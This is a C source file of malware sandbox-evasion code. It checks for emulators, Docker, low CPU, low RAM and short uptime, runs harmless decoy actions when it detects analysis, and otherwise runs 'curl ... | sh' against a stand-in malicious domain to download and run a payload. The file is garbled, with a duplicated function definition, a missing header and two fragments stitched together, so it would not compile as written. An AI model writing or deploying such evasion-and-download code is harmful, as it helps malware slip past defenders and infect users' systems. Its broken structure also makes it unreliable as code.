// SandboxEscape.c - C Source File

#include <unistd.h>
#include <sys/stat.h>

int is_sandboxed() {
    // Check for unusual system configurations
    struct stat st;
    
    // 1. Check for common sandbox paths
    if(stat("/system/androVM", &st) == 0) return 1;
    if(stat("/Applications/Xcode.app", &st) == 0) return 1;
    
    // 2. Check CPU cores (sandboxes often have few)
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    if(cores < 2) return 1;
    
    // 3. Check RAM size
    long ram = sysconf(_SC_PHYS_PAGES) * sysconf(_SC_PAGE_SIZE);
    if(ram < 1024*1024*1024) return 1;  // <1GB
    
    // 4. Check uptime (sandboxes often reset)
    FILE *uptime = fopen("/proc/uptime", "r");
    if(uptime) {
        float up_seconds;
        fscanf(uptime, "%f", &up_seconds);
        fclose(uptime);
        if(up_seconds < 300) return 1;  // <5 minutes
    }
    
    return 0;
}

void evasion_tactics() {
    if(is_sandboxed()) {
        // Trigger benign behavior
        perform_decoy_operations();
    } else {
        // Execute real payload
        execute_main_payload();
    }
}

#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>

int is_sandboxed() {
    // Check CPU cores
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    if(cores < 2) return 1;
    
    // Check RAM
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    if(pages * page_size < 1073741824) return 1; // <1GB
    
    // Check filesystem
    struct stat st;
    if(stat("/", &st) == 0) {
        if(st.st_nlink < 20) return 1;  // Suspicious root inode
    }
    
    // Check common sandbox files
    if(access("/.dockerenv", F_OK) == 0) return 1;
    if(access("/.dockerinit", F_OK) == 0) return 1;
    
    return 0;
}

void perform_decoy_operations() {
    // Benign-looking activity
    system("echo 'System update in progress'");
    sleep(1);
    system("ping -c 1 8.8.8.8 > /dev/null");
}

void execute_main_payload() {
    // Actual payload execution
    system("curl -s http://malicious-domain.com/payload | sh");
}
